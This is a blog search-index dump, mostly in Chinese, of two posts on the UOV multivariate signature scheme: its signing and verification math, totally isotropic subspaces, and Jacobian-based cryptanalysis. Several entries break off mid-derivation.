Matters","uri":"/vectorspace-matters/"},{"categories":[],"content":"结论 假设不成立，故必有： $$ \\dim(\\mathcal{O}) \\leq \\left\\lfloor \\frac{n}{2} \\right\\rfloor \\quad \\blacksquare $$","date":"2025-03-16","objectID":"/vectorspace-matters/:4:3","tags":[],"title":"Vectorspace Matters","uri":"/vectorspace-matters/"},{"categories":[],"content":"几何解释 全迷向子空间维数上界 $\\left\\lfloor \\frac{n}{2} \\right\\rfloor$ 反映了： 在欧几里得空间中（正定二次型），全迷向子空间只能是 ${0}$ 在闵可夫斯基空间中（符号差 $(n-1,1)$），最大全迷向子空间维数为 $1$ 在辛空间中（交错形式），存在维数为 $n/2$ 的全迷向子空间 Notations in Cryptanalysis Forgery - from one msg to a space Key Recovery - as the name said. ","date":"2025-03-16","objectID":"/vectorspace-matters/:4:4","tags":[],"title":"Vectorspace Matters","uri":"/vectorspace-matters/"},{"categories":[],"content":"Forgery Forgery In RSA from $e$ and leakage derive the set $S$ $$ S = \\set{d_i | a^{ed_i} \\equiv a \\pmod n, \\forall a \\quad in \\quad \\mathbb{Z_n}} $$","date":"2025-03-16","objectID":"/vectorspace-matters/:5:0","tags":[],"title":"Vectorspace Matters","uri":"/vectorspace-matters/"},{"categories":[],"content":"UOV Scheme ","date":"2025-03-16","objectID":"/vectorspace-matters/:6:0","tags":[],"title":"Vectorspace Matters","uri":"/vectorspace-matters/"},{"categories":[],"content":"Para UOV（Unbalanced Oil and Vinegar）签名方案由以下参数确定： $m$：二次方程的个数（也是输出维度） $n$：变量个数（输入维度），通常 $n \u003e m$ $q$：有限域的大小（通常是小的素数或 $2$ 的幂） 设工作在有限域 $\\mathbb{F}_q$ 上。 ","date":"2025-03-16","objectID":"/vectorspace-matters/:6:1","tags":[],"title":"Vectorspace Matters","uri":"/vectorspace-matters/"},{"categories":[],"content":"公钥与私钥结构 公钥：由 $m$ 个二次型构成的函数向量： $$ G = (G_1, \\dots, G_m), \\quad G_i : \\mathbb{F}_q^n \\to \\mathbb{F}_q $$ 每个 $G_i$ 是一个二次齐次多项式。 私钥：由一组特殊结构的映射组成： 一个多变量二次映射 $F : \\mathbb{F}_q^n \\to \\mathbb{F}_q^m$，其中： $$ F(\\mathbf{x}) = (F_1(\\mathbf{x}), \\dots, F_m(\\mathbf{x})) $$ 每个 $F_i$ 是构造得使前 $m$ 个变量（称为 oil）在其中只以线性形式出现； 一个可逆的线性变换矩阵 $A \\in \\mathrm{GL}_n(\\mathbb{F}_q)$，用于隐藏结构。 私钥使得： 存在一组向量 $\\mathbf{o}_1, \\dots, \\mathbf{o}_m \\in \\mathbb{F}_q^n$，使得其张成空间 $\\mathcal{O} = \\mathrm{span}(\\mathbf{o}_1, \\dots, \\mathbf{o}_m)$ 是每个 $G_i$ 的二次齐次部分的 迷向子空间（totally isotropic subspace）； 即对于所有 $\\mathbf{u}, \\mathbf{v} \\in \\mathcal{O}$，有： $$ G_i^{(2)}(\\mathbf{u} + \\mathbf{v}) - G_i^{(2)}(\\mathbf{u}) - G_i^{(2)}(\\mathbf{v}) = 0 $$ ","date":"2025-03-16","objectID":"/vectorspace-matters/:6:2","tags":[],"title":"Vectorspace Matters","uri":"/vectorspace-matters/"},{"categories":[],"content":"签名过程（Signer） 给定私钥 $(A, F)$，签名者希望对消息 $\\mu \\in {0,1}^*$ 生成签名。 计算哈希值： $$ \\mathbf{z} = \\mathcal{H}(\\mu) \\in \\mathbb{F}_q^m $$ 多次尝试以下过程直到成功： 随机选取 Vinegar 变量 $\\mathbf{v} \\in \\mathbb{F}_q^{n - m}$ 将其代入 $F(\\mathbf{x})$，只剩 $m$ 个未知量（oil 变量），求解线性方程组： $$ F(\\mathbf{o}, \\mathbf{v}) = \\mathbf{z} $$ 若有解，拼接得 $\\mathbf{x} = (\\mathbf{o}, \\mathbf{v})$ 应用线性变换： $$ \\mathbf{y} = A^{-1} \\mathbf{x} $$ 输出签名： $$ \\sigma = \\mathbf{y} $$ ","date":"2025-03-16","objectID":"/vectorspace-matters/:6:3","tags":[],"title":"Vectorspace Matters","uri":"/vectorspace-matters/"},{"categories":[],"content":"验签过程（Verifier） 验证者已知公钥 $G$，以及消息 $\\mu$ 和签名 $\\sigma = \\mathbf{y}$。 计算哈希值： $$ \\mathbf{z} = \\mathcal{H}(\\mu) $$ 验证： $$ G(\\mathbf{y}) \\stackrel{?}{=} \\mathbf{z} $$ ","date":"2025-03-16","objectID":"/vectorspace-matters/:6:4","tags":[],"title":"Vectorspace Matters","uri":"/vectorspace-matters/"},{"categories":[],"content":"Oil \u0026 Vinegar 变量 在私钥构造中，我们将变量分为两类： Oil（油）变量：前 $m$ 个变量 $x_1, \\dots, x_m$ Vinegar（醋）变量：剩余的 $v = n - m$ 个变量 私钥映射 $F$ 被构造得使得每个 $F_i$ 对 oil 变量是线性的，因此在给定 vinegar 值后，求解 $F(\\mathbf{x}) = \\mathcal{H}(\\mu)$ 成为一个线性问题。 ","date":"2025-03-16","objectID":"/vectorspace-matters/:6:5","tags":[],"title":"Vectorspace Matters","uri":"/vectorspace-matters/"},{"categories":[],"content":"Kipnis-Shamir Attack From this attack, the authors observed some facts. ","date":"2025-03-16","objectID":"/vectorspace-matters/:7:0","tags":[],"title":"Vectorspace Matters","uri":"/vectorspace-matters/"},{"categories":[],"content":"lemma3 ","date":"2025-03-16","objectID":"/vectorspace-matters/:7:1","tags":[],"title":"Vectorspace Matters","uri":"/vectorspace-matters/"},{"categories":[],"content":"Key Observation ","date":"2025-03-16","objectID":"/vectorspace-matters/:8:0","tags":[],"title":"Vectorspace Matters","uri":"/vectorspace-matters/"},{"categories":[],"content":"lemma4 Lemma 4 证明解析 给定条件 $G = (G_1,\\ldots,G_m)$ 是秩为 $n$ 的齐次二次映射，由 $m$ 个矩阵表示 $\\mathcal{O}$ 是 $G_1,\\ldots,G_m$ 的公共全迷向子空间 取非零向量 $\\boldsymbol{x} \\in \\mathcal{O} \\setminus {\\mathbf{0}}$ 定义： $$ J(\\boldsymbol{x}) = \\left( \\boldsymbol{x}^{T} G_{1}, \\ldots, \\boldsymbol{x}^{T} G_{m} \\right) $$（雅克比矩阵去掉常系数） 需证明 $\\mathcal{O} \\subset \\ker(J(\\boldsymbol{x}))$ $\\ker(J(\\boldsymbol{x}))$ 一般是 $(n-m)$ 维子空间 证明步骤解析 步骤 1：证明 $\\mathcal{O} \\subset \\ker(J(\\boldsymbol{x}))$ 应用全迷向性质 由 Lemma 1，对任意 $\\boldsymbol{z} \\in \\mathcal{O}$ 和任意 $G_i$： $$ g_i(\\boldsymbol{x}) = g_i(\\boldsymbol{z}) = 0 \\quad \\text{且} \\quad g_i^{\\*}(\\boldsymbol{z},\\boldsymbol{x}) = 0 $$ 其中 $g_i^*$ 是与 $G_i$ 关联的双线性形式。 构造线性形式 固定 $\\boldsymbol{x}$ 后，定义线性形式： $$ g_{\\boldsymbol{x}}^i(\\cdot) = g_i^\\*(\\boldsymbol{x},\\ \\cdot\\ ) $$ 全迷向性质表明： $$ g_{\\boldsymbol{x}}^i(\\boldsymbol{z}) = g_i^*(\\boldsymbol{x},\\boldsymbol{z}) = 0 $$故 $\\mathcal{O} \\subset \\ker(g_{\\boldsymbol{x}}^i)$。 矩阵形式等价 线性形式 $g_{\\boldsymbol{x}}^i$ 可表示为： $$ g_{\\boldsymbol{x}}^i(\\boldsymbol{v}) = \\boldsymbol{x}^T G_i \\boldsymbol{v} $$ 因此有： $$ \\ker(g_{\\boldsymbol{x}}^i) = \\ker(\\boldsymbol{x}^T G_i) $$ 建立包含关系 由上述得： $$ \\mathcal{O} \\subset \\bigcap_{i=1}^m \\ker(\\boldsymbol{x}^T G_i) $$ 而根据定义： $$ \\ker(J(\\boldsymbol{x})) = \\bigcap_{i=1}^m \\ker(\\boldsymbol{x}^T G_i) $$ 故证得： $$ \\mathcal{O} \\subset \\ker(J(\\boldsymbol{x})) $$ 步骤 2：证明 $\\dim \\ker(J(\\boldsymbol{x})) = n - m$ (一般情况) 分析单个核 每个 $G_i$ 秩为 $n$ 且 $\\boldsymbol{x} \\neq \\mathbf{0}$ 线性形式 $g_{\\boldsymbol{x}}^i = \\boldsymbol{x}^T G_i$ 非零 故每个 $\\ker(\\boldsymbol{x}^T G_i)$ 是 $\\mathbb{F}_q^n$ 中的超平面（维数 $n-1$） 超平面交点维数 $\\ker(J(\\boldsymbol{x}))$ 是 $m$ 个超平面的交集： $$ \\dim \\left( \\bigcap_{i=1}^m H_i \\right) = n - m \\quad \\text{(当超平面处于一般位置)} $$ 其中 $H_i = \\ker(\\boldsymbol{x}^T G_i)$。 处理非一般位置 若超平面线性相关（如法向量线性相关），则： $$ \\dim \\ker(J(\\boldsymbol{x})) \u003e n - m $$ 但由 Schwartz-Zippel 引理： $$ \\Pr_{}{(\\boldsymbol{x})}\\left[\\text{超平面非一般位置}\\right] \\leq \\frac{c}{q} $$ ($c$ 为常数，$q$ 为域大小) 随机化策略 若遇非一般位置： 重新随机选择 $\\boldsymbol{x} \\in \\mathcal{O} \\setminus {\\mathbf{0}}$ 期望尝试次数为常数（因失败概率有界） 备注：雅可比矩阵解释 雅克比矩阵原始定义： $$ \\mathbf{J}_{\\mathbf{f}} = \\left[ \\frac{\\partial \\mathbf{f}}{\\partial x_1} \\quad \\cdots \\quad \\frac{\\partial \\mathbf{f}}{\\partial x_n} \\right] = \\begin{bmatrix} \\nabla^{\\mathsf{T}} f_1 \\\\\\\\ \\vdots \\\\\\\\ \\nabla^{\\mathsf{T}} f_m \\end{bmatrix} = \\begin{bmatrix} \\frac{\\partial f_1}{\\partial x_1} \u0026 \\cdots \u0026 \\frac{\\partial f_1}{\\partial x_n} \\\\\\\\ \\vdots \u0026 \\ddots \u0026 \\vdots \\\\\\\\ \\frac{\\partial f_m}{\\partial x_1} \u0026 \\cdots \u0026 \\frac{\\partial f_m}{\\partial x_n} \\end{bmatrix} $$$f$ 为二次型映射时： $$ \\mathbf{J}_{\\mathbf{f}} = 2\\mathbf{x}^TA $$二次型映射的 Jacobi 矩阵推导 二次型映射的定义 设一个二次型映射 $f: \\mathbb{R}^n \\to \\mathbb{R}$ 定义为： $$ f(\\mathbf{x}) = \\mathbf{x}^{\\mathsf{T}} A \\mathbf{x} $$ 其中： $\\mathbf{x} = [x_1, x_2, \\ldots, x_n]^{\\mathsf{T}}$ 是一个 $n \\times 1$ 的列向量。$A$ 是一个 $n \\times n$ 的实对称矩阵，即 $A = A^{\\mathsf{T}}$。我们可以将 $A$ 的元素表示为 $a_{ij}$，对于 $i,j = 1, \\ldots, n$。 展开二次型 将二次型 $f(\\mathbf{x})$ 展开为求和形式： $$ f(\\mathbf{x}) = \\sum_{i=1}^{n} \\sum_{j=1}^{n} a_{ij} x_i x_j $$计算偏导数 为了得到 Jacobi 矩阵（对于标量值函数，Jacobi 矩阵即为梯度向量的转置），我们需要计算 $f(\\mathbf{x})$ 对每个 $x_k$ ($k=1, \\ldots, n$) 的偏导数。 考虑对 $x_k$ 的偏导数： $$ \\frac{\\partial f}{\\partial x_k} = \\frac{\\partial}{\\partial x_k} \\left( \\sum_{i=1}^{n} \\sum_{j=1}^{n} a_{ij} x_i x_j \\right) $$在求和中，只有当 $i=k$ 或 $j=k$ 时，项 $a_{ij} x_i x_j$ 才包含 $x_k$。我们可以将求和项分为三类： $i=k, j \\neq k$ 的项：$a_{kj} x_k x_j$ $j=k, i \\neq k$ 的项：$a_{ik} x_i x_k$ $i=k, j=k$ 的项：$a_{kk} x_k x_k = a_{kk} x_k^2$ 因此，偏导数可以写为： $$ \\begin{align*} \\frac{\\partial f}{\\partial x_k} \u0026= \\sum_{j=1, j \\neq k}^{n} \\frac{\\partial}{\\partial x_k} (a_{kj} x_k x_j) + \\sum_{i=1, i \\neq k}^{n} \\frac{\\partial}{\\partial x_k} (a_{ik} x_i x_k) + \\frac{\\partial}{\\partial x_k} (a_{kk} x_k^2) \\\\ \u0026= \\sum_{j=1, j \\neq k}^{n} a_{kj} x_j + \\sum_{i=1, i \\neq k}^{n} a_{ik} x_i + 2 a_{kk} x_k \\end{align*} $$由于矩阵 $A$ 是对称的，我们有 $a_{ik} = a_{ki}$。因此，第二个求和项可以改写为： $$ \\sum_{i=1, i \\neq k}^{n} a_{ik} x_i = \\sum_{i=1, i \\neq k}^{n} a_{ki} x_i $$现在，结合各项： $$ \\frac{\\partial f}{\\partial x_k} = \\sum_{j=1, j \\neq k}^{n} a_{kj} x_j + ","date":"2025-03-16","objectID":"/vectorspace-matters/:8:1","tags":[],"title":"Vectorspace Matters","uri":"/vectorspace-matters/"},{"categories":[],"content":"Distinguisher ","date":"2025-03-16","objectID":"/vectorspace-matters/:9:0","tags":[],"title":"Vectorspace Matters","uri":"/vectorspace-matters/"},{"categories":[],"content":"Summary From One Vector to Rule By the properties of an istropic subspace and Jacobi Matrix, equivalent to forgery. :) ","date":"2025-03-16","objectID":"/vectorspace-matters/:10:0","tags":[],"title":"Vectorspace Matters","uri":"/vectorspace-matters/"},{"categories":[],"content":"Refferences Characteristics One Vector to Rule Them All Another Paper To Read ","date":"2025-03-16","objectID":"/vectorspace-matters/:11:0","tags":[],"title":"Vectorspace Matters","uri":"/vectorspace-matters/"},{"categories":[],"content":"UOV ","date":"2024-11-13","objectID":"/uov/:1:0","tags":[],"title":"Way-To-MPKC From UOV","uri":"/uov/"},{"categories":[],"content":"Notation 本文将使用以下变量： \\(m\\) 个“油”变量 (Oil): \\(o_1, o_2, \\dots, o_m\\) \\(v\\) 个“醋”变量 (Vinegar): \\(v_1, v_2, \\dots, v_v\\) (其中 \\(v = n-m\\)) \\(m\\) 个方程 \\(F_1, \\dots, F_m\\) \\(m\\) 个目标哈希值 \\(z_1, \\dots, z_m\\) 我们要处理的系统是 \\(F(x) = z\\)，即 \\(F_k(o, v) = z_k\\)，对 \\(k = 1, \\dots, m\\) 成立。 ","date":"2024-11-13","objectID":"/uov/:1:1","tags":[],"title":"Way-To-MPKC From UOV","uri":"/uov/"},{"categories":[],"content":"\\(F\\) 的特殊结构 UOV的核心秘密在于 \\(F\\) 的特殊构造：\\(F\\) 的方程中可以有任意的“醋-醋”项 (\\(v_i v_j\\)) 和“油-醋”项 (\\(o_i v_j\\))，但绝对没有“油-油”项 (\\(o_i o_j\\))。 因此，我们的 \\(m\\) 个方程中，第 \\(k\\) 个方程 \\(F_k\\) 的最一般形式可以写成： $$ F_k(o, v) = \\underbrace{\\sum_{i=1}^{v} \\sum_{j=i}^{v} \\alpha_{k,i,j} v_i v_j}_{\\text{醋-醋 (二次)}} + \\underbrace{\\sum_{i=1}^{m} \\sum_{j=1}^{v} \\beta_{k,i,j} o_i v_j}_{\\text{油-醋 (混合)}} + \\underbrace{\\sum_{i=1}^{m} \\gamma_{k,i} o_i + \\sum_{j=1}^{v} \\delta_{k,j} v_j + C_k}_{\\text{所有线性项和常数项}} $$ \\(\\alpha, \\beta, \\gamma, \\delta, C\\) 都是私钥中已知的常数系数。 注意看，这个方程对于 \\(v\\) 变量是二次的，但对于 \\(o\\) 变量是线性的（\\(o_i\\) 只以 1 次方出现）。 ","date":"2024-11-13","objectID":"/uov/:1:2","tags":[],"title":"Way-To-MPKC From UOV","uri":"/uov/"},{"categories":[],"content":"签名者的目标 签名者的目标是找到一组 \\((o, v)\\) 使得 \\(F_k(o, v) = z_k\\) 对所有的 \\(k=1, \\dots, m\\) 成立。 完整的方程组（共 \\(m\\) 个）看起来是这样的： $$ \\begin{cases} F_1(o, v) = z_1 \\\\\\\\ F_2(o, v) = z_2 \\\\\\\\ \\quad \\vdots \\\\\\\\ F_m(o, v) = z_m \\end{cases} $$","date":"2024-11-13","objectID":"/uov/:1:3","tags":[],"title":"Way-To-MPKC From UOV","uri":"/uov/"},{"categories":[],"content":"关键操作 签名者执行以下操作： 随机选择“醋”： 签名者为所有 \\(v\\) 个“醋”变量 \\(v_1, \\dots, v_v\\) 随机挑选一组具体的值，我们称之为 \\(\\bar{v}_1, \\dots, \\bar{v}_v\\)。 代入方程： 将这些已知的 \\(\\bar{v}\\) 值代入到第 1 步的 \\(F_k\\) 方程中。 我们来看代入后，第 \\(k\\) 个方程 \\(F_k(o, \\bar{v}) = z_k\\) 变成了什么： $$ z_k = \\sum_{i=1}^{v} \\sum_{j=i}^{v} \\alpha_{k,i,j} \\bar{v}_i \\bar{v}_j + \\sum_{i=1}^{m} \\sum_{j=1}^{v} \\beta_{k,i,j} o_i \\bar{v}_j + \\sum_{i=1}^{m} \\gamma_{k,i} o_i + \\sum_{j=1}^{v} \\delta_{k,j} \\bar{v}_j + C_k $$","date":"2024-11-13","objectID":"/uov/:1:4","tags":[],"title":"Way-To-MPKC From UOV","uri":"/uov/"},{"categories":[],"content":"推导与重组 现在，方程中唯一的未知数只剩下 \\(m\\) 个“油”变量 \\(o_1, \\dots, o_m\\)。 我们把上式中所有包含 \\(o_i\\) 的项（未知项）移到左边，所有纯常数项（已知项）移到右边。 1. 找出所有未知项（包含 \\(o_i\\) 的项）： $$ \\sum_{i=1}^{m} \\sum_{j=1}^{v} \\beta_{k,i,j} o_i \\bar{v}_j + \\sum_{i=1}^{m} \\gamma_{k,i} o_i $$我们可以按 \\(o_i\\) 合并同类项： $$ = \\sum_{i=1}^{m} o_i \\cdot \\left( \\sum_{j=1}^{v} \\beta_{k,i,j} \\bar{v}_j + \\gamma_{k,i} \\right) $$2. 找出所有已知项（纯常数项）： $$ \\sum_{i=1}^{v} \\sum_{j=i}^{v} \\alpha_{k,i,j} \\bar{v}_i \\bar{v}_j + \\sum_{j=1}^{v} \\delta_{k,j} \\bar{v}_j + C_k $$3. 重组第 \\(k\\) 个方程： $$ \\sum_{i=1}^{m} o_i \\cdot \\underbrace{\\left( \\sum_{j=1}^{v} \\beta_{k,i,j} \\bar{v}_j + \\gamma_{k,i} \\right)}_{\\text{这是 \\(o_i\\) 的系数, 记为 } A_{k,i}} = z_k - \\underbrace{\\left( \\sum_{i=1}^{v} \\sum_{j=i}^{v} \\alpha_{k,i,j} \\bar{v}_i \\bar{v}_j + \\sum_{j=1}^{v} \\delta_{k,j} \\bar{v}_j + C_k \\right)}_{\\text{这是一个大常数, 记为 } B_k} $$","date":"2024-11-13","objectID":"/uov/:1:5","tags":[],"title":"Way-To-MPKC From UOV","uri":"/uov/"},{"categories":[],"content":"线性系统显现 因为所有的 \\(\\bar{v}_j\\) 都是已知值，所以 \\(A_{k,i}\\) 和 \\(B_k\\) 都是可以计算出来的具体常数。 我们再定义一个常数 \\(R_k = z_k - B_k\\)。 现在，第 \\(k\\) 个方程被严格地简化为： $$ A_{k,1} o_1 + A_{k,2} o_2 + \\dots + A_{k,m} o_m = R_k $$这，就是一个关于 \\(o_1, \\dots, o_m\\) 的一元线性方程。 ","date":"2024-11-13","objectID":"/uov/:1:6","tags":[],"title":"Way-To-MPKC From UOV","uri":"/uov/"},{"categories":[],"content":"最终的 \\(m \\times m\\) 线性系统 我们有 \\(m\\) 个这样的方程（\\(k=1\\) 到 \\(m\\)），把它们全部写在一起，就得到了一个 \\(m\\) 个方程、 \\(m\\) 个未知数（\\(o_1, \\dots, o_m\\)）的标准线性方程组： $$ \\begin{cases} A_{1,1}o_1 + A_{1,2}o_2 + \\dots + A_{1,m}o_m = R_1 \\\\\\\\ A_{2,1}o_1 + A_{2,2}o_2 + \\dots + A_{2,m}o_m = R_2 \\\\\\\\ \\quad \\vdots \\\\\\\\ A_{m,1}o_1 + A_{m,2}o_2 + \\dots + A_{m,m}o_m = R_m \\end{cases} $$这就是推导的最终结果。 签名者通过高斯消元法等标准方法解这个 \\(m \\times m\\) 线性系统，得到“油”变量 \\(\\bar{o}_1, \\dots, \\bar{o}_m\\) 的值。 (如果这个 \\(m \\times m\\) 系统恰好无解，签名者只需回到第 3 步，重新随机选择一组 \\(\\bar{v}\\) 值，再试一次即可。) ","date":"2024-11-13","objectID":"/uov/:1:7","tags":[],"title":"Way-To-MPKC From UOV","uri":"/uov/"},{"categories":[],"content":"验证过程：纯粹的“代入求值” 我们来梳理一下验证者（Verifier）的工作： 验证者拥有： 公钥 \\(G\\)： 那组 \\(m\\) 个公开的、看起来非常复杂的二次方程。 消息 \\(\\mu\\)： 原始消息。 签名 \\(y\\)： 签名者提供的 \\(n\\) 个值的向量， \\(y = (y_1, y_2, \\dots, y_n)\\)。 验证步骤： 计算目标哈希值： 验证者计算 \\(z = H(\\mu)\\)。 ( \\(z\\) 是一个 \\(m\\) 个值的向量) 核心步骤：计算签名结果 \\(z'\\) 验证者将收到的签名 \\(y\\)（这 \\(n\\) 个数值）代入到公钥 \\(G\\) 的 \\(m\\) 个方程中，计算出结果 \\(z'\\)。 $$ z' = G(y) $$展开来说，就是： $$ \\begin{cases} z'_1 = G_1(y_1, y_2, \\dots, y_n) \\\\\\\\ z'_2 = G_2(y_1, y_2, \\dots, y_n) \\\\\\\\ \\quad \\vdots \\\\\\\\ z'_m = G_m(y_1, y_2, \\dots, y_n) \\end{cases} $$这里没有任何“求解”。\\(G\\) 是已知的方程，\\(y\\) 是已知的数值。这只是一个纯粹的算术计算。 比对： 验证者检查 \\(z'\\) 是否等于 \\(z\\)。 如果 \\(z' = z\\)，签名有效。 如果 \\(z' \\neq z\\)，签名无效。 特征 (Feature) 签名过程 (Signing Process) 验证过程 (Verification Process) 目标 (Goal) 求解 \\(y\\) 使得 \\(G(y)=z\\) 检查 \\(G(y)\\) 是否等于 \\(z\\) 所用密钥 (Key Used) 私钥 (\\(F\\) 和 \\(A\\)) 公钥 (\\(G\\)) 核心操作 (Core Op) 解方程 (Solve Equations) 函数求值 (Evaluate Function) “线性系统\"在何处 有 (Exists)：通过固定“醋”变量，将 \\(F(x)=z\\) 转化为 \\(m \\times m\\) 线性系统来求解“油”变量。 无 (Does not exist)：只是将 \\(y\\) 代入 \\(G\\) 中进行二次计算。 \\(A\\) 的作用 用 \\(A^{-1}\\) 将解 \\(x\\) 变换为签名 \\(y\\) (\\(y = A^{-1}(x)\\))。 不使用 \\(A\\) 或 \\(A^{-1}\\)。 ","date":"2024-11-13","objectID":"/uov/:1:8","tags":[],"title":"Way-To-MPKC From UOV","uri":"/uov/"},{"categories":[],"content":"总结 签名的“魔法”在于利用秘密 \\(F\\) 和 \\(A\\) 将一个（对他人而言）困难的二次问题转化为一个（对自己而言）简单的线性问题来求解。 验证的“朴实”在于它不进行任何变换，它只是代入签名 \\(y\\) 到公钥 \\(G\\) 中，看结果是否匹配。 这正是UOV方案（以及所有公钥密码）安全性的基础：正向计算 \\(G(y)\\) 很容易，但反向求解 \\(y\\)（即签名）在没有私钥“后门”的情况下极其困难。 ","date":"2024-11-13","objectID":"/uov/:1:9","tags":[],"title":"Way-To-MPKC From UOV","uri":"/uov/"},{"categories":[],"content":"矩阵视角 ","date":"2024-11-13","objectID":"/uov/:2:0","tags":[],"title":"Way-To-MPKC From UOV","uri":"/uov/"},{"categories":[],"content":"二次型的一般矩阵表示 任何一个 \\(n\\) 元二次方程 \\(f(x) = z\\) 都可以被写成矩阵形式： $$f(x) = x^T P x + L^T x + C = z$$ \\(x\\) 是 \\(n \\times 1\\) 的变量向量。 \\(P\\) 是一个 \\(n \\times n\\) 的对称矩阵，代表所有二次项（如 \\(x_i x_j\\)）。 \\(L\\) 是一个 \\(n \\times 1\\) 的向量，代表所有线性项（如 \\(x_i\\)）。 \\(C\\) 是一个常数。 ","date":"2024-11-13","objectID":"/uov/:2:1","tags":[],"title":"Way-To-MPKC From UOV","uri":"/uov/"},{"categories":[],"content":"签名者的视角：\\(F\\) 的矩阵结构 签名者使用私有变量 \\(x\\)，它被结构化地分为“油” \\(o\\) ( \\(m \\times 1\\) 向量) 和“醋” \\(v\\) ( \\(v \\times 1\\) 向量)： $$x = \\begin{bmatrix} o \\\\\\\\ v \\end{bmatrix}$$私钥 \\(F\\) 的 \\(m\\) 个方程中的第 \\(k\\) 个 \\(F_k(x) = z_k\\) 具有 “无油-油” 的特殊结构。 这意味着 \\(F_k\\) 的二次型矩阵 \\(P_k\\)（一个 \\(n \\times n\\) 矩阵）在 \\(x = \\begin{bmatrix} o \\\\\\\\ v \\end{bmatrix}\\) 这个基下，具有一个特定的块(block)结构： $$ P_k = \\begin{bmatrix} P_{oo} \u0026 P_{ov} \\\\\\\\ P_{vo} \u0026 P_{vv} \\end{bmatrix} $$ \\(P_{oo}\\) 是 \\(m \\times m\\) 矩阵，代表“油-油”项。 \\(P_{vv}\\) 是 \\(v \\times v\\) 矩阵，代表“醋-醋”项。 \\(P_{ov}\\) 和 \\(P_{vo}\\) 是 \\(m \\times v\\) 和 \\(v \\times m\\) 矩阵，代表“油-醋”混合项 (且 \\(P_{vo} = P_{ov}^T\\))。 UOV的核心秘密就是：\\(P_{oo} = 0_{m \\times m}\\) ( \\(m \\times m\\) 的零矩阵)。 同时，线性部分的向量 \\(L_k\\) 也可以被分块： \\(L_k = \\begin{bmatrix} L_o \\\\\\\\ L_v \\end{bmatrix}\\)。 ","date":"2024-11-13","objectID":"/uov/:2:2","tags":[],"title":"Way-To-MPKC From UOV","uri":"/uov/"},{"categories":[],"content":"签名者的线性系统变换演示 签名者的第 \\(k\\) 个方程 \\(F_k(x) = z_k\\) 写作： $$ \\begin{bmatrix} o^T \u0026 v^T \\end{bmatrix} \\begin{bmatrix} 0 \u0026 P_{ov} \\\\\\\\ P_{vo} \u0026 P_{vv} \\end{bmatrix} \\begin{bmatrix} o \\\\\\\\ v \\end{bmatrix} + \\begin{bmatrix} L_o^T \u0026 L_v^T \\end{bmatrix} \\begin{bmatrix} o \\\\\\\\ v \\end{bmatrix} + C_k = z_k $$第 1 步：固定“醋” \\(v = \\bar{v}\\) 签名者随机选择一个常数向量 \\(\\bar{v}\\) 并代入。\\(o\\) 成为唯一的变量。 $$ \\begin{bmatrix} o^T \u0026 \\bar{v}^T \\end{bmatrix} \\begin{bmatrix} 0 \u0026 P_{ov} \\\\\\\\ P_{vo} \u0026 P_{vv} \\end{bmatrix} \\begin{bmatrix} o \\\\\\\\ \\bar{v} \\end{bmatrix} + \\begin{bmatrix} L_o^T \u0026 L_v^T \\end{bmatrix} \\begin{bmatrix} o \\\\\\\\ \\bar{v} \\end{bmatrix} + C_k = z_k $$第 2 步：展开矩阵乘法 (二次项部分) $$ (o^T \\cdot 0 \\cdot o) + (o^T P_{ov} \\bar{v}) + (\\bar{v}^T P_{vo} o) + (\\bar{v}^T P_{vv} \\bar{v}) $$第 3 步：化简 \\(o^T \\cdot 0 \\cdot o = 0\\) 这就是“魔法”发生的地方。 \\(o\\) 的所有二次项 \\(o_i o_j\\) 全部消失了，因为它们对应的系数矩阵是 \\(0\\)。 \\((o^T P_{ov} \\bar{v}) + (\\bar{v}^T P_{vo} o)\\) 因为 \\(P_{vo} = P_{ov}^T\\)，这两项是相等的（它们是标量，互为转置）。 这部分等于 \\(2 (\\bar{v}^T P_{vo}) o\\)。这是一个 \\(o\\) 的线性项。 \\((\\bar{v}^T P_{vv} \\bar{v})\\) \\(\\bar{v}\\) 是常数，\\(P_{vv}\\) 是常数矩阵。这是一个常数。 第 4 步：展开线性项部分 $$ L_o^T o + L_v^T \\bar{v} $$ \\(L_o^T o\\) 是 \\(o\\) 的线性项。 \\(L_v^T \\bar{v}\\) 是一个常数。 第 5 步：重组方程 我们将所有 \\(o\\) 的项（都是线性的）留在左边，所有常数项移到右边： $$ \\underbrace{[ 2 (\\bar{v}^T P_{vo}) + L_o^T ]}_{\\text{一个 } 1 \\times m \\text{ 的常数行向量}} \\cdot o = \\underbrace{z_k - (\\bar{v}^T P_{vv} \\bar{v}) - (L_v^T \\bar{v}) - C_k}_{\\text{一个常数}} $$第 6 步：最终的线性系统 我们把 \\(m\\) 个这样的方程（\\(k=1\\) 到 \\(m\\)）堆叠起来。 左侧的 \\(m\\) 个 (\\(1 \\times m\\)) 行向量组成了一个 \\(m \\times m\\) 的常数系数矩阵 \\(M'\\)。 右侧的 \\(m\\) 个常数组成了一个 \\(m \\times 1\\) 的常数向量 \\(R\\)。 签名者得到了一个易于求解的 \\(m \\times m\\) 线性系统： $$ M' \\cdot o = R $$ ","date":"2024-11-13","objectID":"/uov/:2:3","tags":[],"title":"Way-To-MPKC From UOV","uri":"/uov/"},{"categories":[],"content":"攻击者的（失败）变换演示 攻击者只知道公钥 \\(G\\) 和公开变量 \\(y\\)。 第 1 步：公钥 \\(G\\) 的矩阵是什么？ \\(G(y) = F(A(y))\\)。代入 \\(x = Ay\\)： $$ G_k(y) = (Ay)^T P_k (Ay) + L_k^T (Ay) + C_k $$$$ G_k(y) = y^T (A^T P_k A) y + (L_k^T A) y + C_k $$公钥 \\(G_k\\) 的矩阵是 \\(P'_k = A^T P_k A\\)。 即使 \\(P_k = \\begin{bmatrix} 0 \u0026 P_{ov} \\\\\\\\ P_{vo} \u0026 P_{vv} \\end{bmatrix}\\) 是稀疏的，但 \\(A\\) 是一个稠密的 \\(n \\times n\\) 矩阵。 \\(P'_k = A^T P_k A\\) 将是一个稠密的 \\(n \\times n\\) 矩阵，它完全隐藏了 \\(P_k\\) 中那个 \\(0\\) 块的结构。 第 2 步：攻击者模仿“固定醋” 攻击者不知道 \\(A\\)，他只能猜测 \\(y\\) 的分块，比如 \\(y = \\begin{bmatrix} y_{oil} \\\\\\\\ y_{vin} \\end{bmatrix}\\)。 他将 \\(P'_k\\)（稠密矩阵）进行相应分块： $$ P'_k = \\begin{bmatrix} P'_{oo} \u0026 P'_{ov} \\\\\\\\ P'_{vo} \u0026 P'_{vv} \\end{bmatrix} $$关键失败点： 由于 \\(A\\) 的“搅浑”作用，\\(P'_k\\) 是稠密的。\\(P'_{oo}\\) 几乎不可能是零矩阵。 第 3 步：代入 \\(\\bar{y}_{vin}\\) 并展开 攻击者得到第 